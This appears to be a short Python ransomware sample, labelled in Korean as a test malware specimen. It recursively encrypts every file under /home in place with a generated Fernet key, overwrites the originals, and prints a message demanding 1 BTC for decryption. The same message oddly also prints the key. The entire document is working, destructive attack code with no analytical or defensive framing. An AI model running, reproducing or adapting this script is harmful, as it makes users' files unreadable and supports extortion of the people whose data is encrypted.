# 테스트용 악성 코드 샘플 - 랜섬웨어
from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
cipher = Fernet(key)

for root, dirs, files in os.walk('/home'):
    for file in files:
        filepath = os.path.join(root, file)
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath, 'wb') as f:
            f.write(encrypted)

print(f"All files encrypted. Send 1 BTC to get decryption key: {key.decode()}")
